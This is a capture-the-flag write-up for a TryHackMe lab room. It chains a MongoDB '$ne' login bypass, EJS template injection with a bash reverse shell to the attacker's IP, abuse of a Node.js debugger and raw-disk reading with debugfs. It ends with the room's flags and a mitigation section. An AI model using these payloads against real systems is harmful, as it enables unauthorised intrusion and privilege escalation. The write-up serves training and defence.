---
layout: default
title: Day 7 - Do Not Disturb
---

- [./ctf-writeups](../../../../) / [TryHackMe](../../../) / [Events](../../) / [Byte Lotus Hotel](../) / [Day 6 - Overhear At Breakfast](../6_Overhear_At_Breakfast)

# Day 7 - Do Not Disturb

[**Try it yourself**](https://tryhackme.com/room/hh-donotdisturb-84a45644) 
**Difficulty:** Medium  
**Category:** Web exploitation / Lateral movement / Privilege escalation

**Summary:** This room involves a multi-step exploitation chain. We begin by bypassing authentication using NoSQL injection, which leads to a Server-Side Template Injection (SSTI) vulnerability for our initial foothold. From there, we exploit a locally exposed Node.js debugger to move laterally to a service account. Finally, we escalate our privileges by abusing the `disk` group to read the root flag directly from the raw hard drive partition.

## 1. Reconnaissance and initial access

Our enumeration started with an `nmap` scan against the target, which revealed an SSH service on port 22 and an Express Node.js web application running on port 80.

Navigating to the web application's login page, we intercepted the authentication request. Because the backend uses a NoSQL database (MongoDB) and fails to sanitize inputs, we successfully bypassed the login by injecting a "not equal" operator (`$ne`) into the password field:

```
curl -i -s -c cookies.txt --data 'username=attendant&password[$ne]=x' http://10.114.141.156/login
```

This granted us a valid session cookie. Using this cookie, we accessed the `/staff/preview` endpoint. By testing the `template` parameter, we discovered it was vulnerable to Server-Side Template Injection (SSTI) using EJS syntax (example `<%=7*7%>`).

We escalated this SSTI to achieve Remote Code Execution (RCE) by requiring the `child_process` module and executing a reverse shell payload:

```
curl -s -b cookies.txt --data-urlencode "template=<%=global.process.mainModule.require('child_process').exec(\"bash -c 'bash -i >&/dev/tcp/10.114.64.58/4444 0>&1'\") %>" http://10.114.141.156/staff/preview
```

Our Netcat listener caught the connection, giving us our initial foothold as the `poolside` user, where we found the first flag.

**Flag:**
<span class="spoiler" role="button" tabindex="0" aria-label="Hidden flag">THM{w4rm_s3ss10n_h1j4ck3d}</span>

## 2. Lateral movement (Node.js debugger)

While enumerating the system as `poolside`, we used `ss -tlnp` and `ps -ef` to look for internal services. We discovered that a Node.js debugger (inspector protocol) was running and listening on the local port `9229`.

Querying `http://127.0.0.1:9229/json` revealed that this debugger belonged to a script named `processor.js`, running under a different user account (`pipelinesvc`). 

To exploit this and move laterally, we used our `poolside` shell to execute a custom Node.js script. This script connected to the debugger's WebSocket URL and injected a payload that forced the `pipelinesvc` process to spawn a new reverse shell back to us on port 4445. 

The execution was successful, and we assumed the identity of `pipelinesvc`.

## 3. Privilege escalation (raw disk access)

Our goal was to read the final flag located at `/root/root.txt`. Attempting to read it directly resulted in a "Permission denied" error.

Checking our current group memberships with the `id` command revealed a critical misconfiguration:

```
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

Our user was a member of the `disk` group. In Linux, members of this group have raw read and write access to block devices (physical hard drives) located in `/dev/`. This allows us to bypass standard file system permissions completely.

We used `df -h /` and `lsblk` to identify that the root filesystem was mounted on the partition `/dev/nvme0n1p1`. 

Using the `debugfs` utility, we interacted directly with the raw partition and extracted the contents of the root flag file:

```
debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1
```

**Flag:**
<span class="spoiler" role="button" tabindex="0" aria-label="Hidden flag">THM{r4w_d1sk_4cc3ss_w4s_t00_much}</span>

## 4. Mitigation (how to fix it)

To prevent this attack chain, system administrators and developers must implement the following security measures:

+ **Prevent NoSQL injection:** Validate and sanitize all user inputs. Use strongly typed data models (like Mongoose for MongoDB) to ensure operators like `$ne` are not parsed as database queries.
+ **Secure template engines:** Never pass raw user input into template rendering functions. If dynamic user input is required, use logic-less templates or strictly sandboxed execution environments.
+ **Disable production debugging:** Ensure that the Node.js Inspector (port 9229) is never enabled in a production environment. 
+ **Apply the principle of least privilege:** Service accounts (like `pipelinesvc`) must never be added to highly privileged administrative groups such as `disk` or `root`. Group memberships should be strictly audited.

<br>
- [Day 8 - Towel On The Sunbed](../8_Towel_On_The_Sunbed)